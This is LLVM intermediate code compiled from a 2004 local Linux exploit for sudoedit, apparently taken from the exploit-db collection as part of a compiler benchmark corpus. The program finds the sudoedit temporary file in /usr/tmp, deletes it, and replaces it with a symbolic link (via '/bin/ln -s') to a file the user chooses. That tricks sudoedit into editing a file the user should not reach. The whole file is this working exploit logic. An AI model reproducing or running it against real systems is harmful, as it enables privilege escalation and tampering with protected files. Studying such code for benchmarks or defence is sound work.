; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_24606.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_24606.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dirent = type { i64 }

@__const.main.PATH = private unnamed_addr constant [9 x i8] c"/usr/tmp\00", align 1
@.str = private unnamed_addr constant [37 x i8] c"Copyright ?? Rosiello Security 2004\0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"http://www.rosiello.org\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"USAGE: %s file\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"rosiello\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"%s/%s\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/ln\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"ln\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-s\00", align 1
@.str.8 = private unnamed_addr constant [49 x i8] c"Now you can close sudoedit and reopen rosiello!\0A\00", align 1
@.str.9 = private unnamed_addr constant [17 x i8] c"File Not Found!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [9 x i8], align 1
  %7 = alloca [32 x i8], align 16
  %8 = alloca i32*, align 8
  %9 = alloca %struct.dirent*, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = bitcast [9 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %11, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.main.PATH, i32 0, i32 0), i64 9, i1 false)
  %12 = getelementptr inbounds [9 x i8], [9 x i8]* %6, i64 0, i64 0
  %13 = call i32* @opendir(i8* %12)
  store i32* %13, i32** %8, align 8
  store i32 0, i32* %10, align 4
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 2
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  store i32 0, i32* %3, align 4
  br label %72

23:                                               ; preds = %2
  br label %24

24:                                               ; preds = %62, %23
  %25 = load i32*, i32** %8, align 8
  %26 = call %struct.dirent* @readdir(i32* %25)
  store %struct.dirent* %26, %struct.dirent** %9, align 8
  %27 = icmp ne %struct.dirent* %26, null
  br i1 %27, label %28, label %63

28:                                               ; preds = %24
  %29 = load %struct.dirent*, %struct.dirent** %9, align 8
  %30 = getelementptr inbounds %struct.dirent, %struct.dirent* %29, i32 0, i32 0
  %31 = load i64, i64* %30, align 8
  %32 = call i32* @strstr(i64 %31, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %33 = icmp ne i32* %32, null
  br i1 %33, label %34, label %62

34:                                               ; preds = %28
  %35 = load %struct.dirent*, %struct.dirent** %9, align 8
  %36 = getelementptr inbounds %struct.dirent, %struct.dirent* %35, i32 0, i32 0
  %37 = load i64, i64* %36, align 8
  %38 = call i32 @strlen(i64 %37)
  %39 = icmp sgt i32 %38, 24
  br i1 %39, label %40, label %41

40:                                               ; preds = %34
  store i32 0, i32* %3, align 4
  br label %72

41:                                               ; preds = %34
  %42 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %43 = getelementptr inbounds [9 x i8], [9 x i8]* %6, i64 0, i64 0
  %44 = load %struct.dirent*, %struct.dirent** %9, align 8
  %45 = getelementptr inbounds %struct.dirent, %struct.dirent* %44, i32 0, i32 0
  %46 = load i64, i64* %45, align 8
  %47 = inttoptr i64 %46 to i8*
  %48 = call i32 @sprintf(i8* %42, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i8* %43, i8* %47)
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %50 = call i32 @remove(i8* %49)
  %51 = call i64 (...) @fork()
  %52 = icmp ne i64 %51, 0
  br i1 %52, label %53, label %59

53:                                               ; preds = %41
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %58 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* %56, i8* %57, i32* null)
  br label %59

59:                                               ; preds = %53, %41
  %60 = call i32 (...) @wait()
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.8, i64 0, i64 0))
  store i32 1, i32* %10, align 4
  br label %64

62:                                               ; preds = %28
  br label %24

63:                                               ; preds = %24
  br label %64

64:                                               ; preds = %63, %59
  %65 = load i32*, i32** %8, align 8
  %66 = call i32 @closedir(i32* %65)
  %67 = load i32, i32* %10, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %71, label %69

69:                                               ; preds = %64
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  br label %71

71:                                               ; preds = %69, %64
  store i32 0, i32* %3, align 4
  br label %72

72:                                               ; preds = %71, %40, %18
  %73 = load i32, i32* %3, align 4
  ret i32 %73
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32* @opendir(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local %struct.dirent* @readdir(i32*) #2

declare dso_local i32* @strstr(i64, i8*) #2

declare dso_local i32 @strlen(i64) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @remove(i8*) #2

declare dso_local i64 @fork(...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i32*) #2

declare dso_local i32 @wait(...) #2

declare dso_local i32 @closedir(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
